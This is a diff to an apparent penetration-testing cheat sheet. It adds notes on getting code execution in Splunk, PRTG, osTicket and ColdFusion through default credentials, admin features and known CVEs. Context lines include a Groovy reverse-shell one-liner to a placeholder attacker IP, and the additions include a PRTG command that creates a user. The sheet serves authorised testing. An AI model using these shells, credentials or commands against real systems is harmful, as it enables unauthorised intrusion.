@@ -53,6 +53,20 @@ def p = ["/bin/bash","-c","bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"].execute()
 
 GitLab: check the version at `/help`, register if sign-up is open, and match it to a known RCE with `searchsploit gitlab`. Drupal: `droopescan scan drupal -u http://TARGET`; older cores fall to Drupalgeddon modules in Metasploit. Joomla: `joomscan -u http://TARGET`, then the administrator template editor for a PHP shell once you have admin.
 
+## Splunk, PRTG, osTicket, ColdFusion
+
+The other default-credential and feature-RCE apps that recur on internal estates:
+
+- **Splunk** (8000/8089): the free licence has no auth; a custom app with a scripted input runs code on the indexer, and `SplunkWhisperer2` pushes it to forwarders. Default `admin:changeme` on old builds.
+- **PRTG** (8080): default `prtgadmin:prtgadmin`; the notification "EXE/Script" feature runs a command as SYSTEM (CVE-2018-9276).
+- **osTicket**: hunt for weak admin creds, then the file-attachment filter to upload a PHP shell; also a known SSRF.
+- **ColdFusion** (8500): the admin panel and directory traversal (CVE-2010-2861) leak the admin hash; `searchsploit coldfusion` for deserialisation RCE on newer versions.
+
+```bash
+searchsploit splunk && searchsploit prtg && searchsploit coldfusion
+# PRTG: once logged in, set a notification script of: net user pentest P@ss! /add
+```
+
 ## Notes
 
 Default-credential and admin-feature RCE are high-impact and leave clear log entries, so confirm the app and the action are in scope before deploying anything, and record the app, version and the credential or feature you used. Prefer a read-only fingerprint until you are sure of the version. In-scope and authorised use only; remove any shell, WAR or theme file you plant and note it for the report.
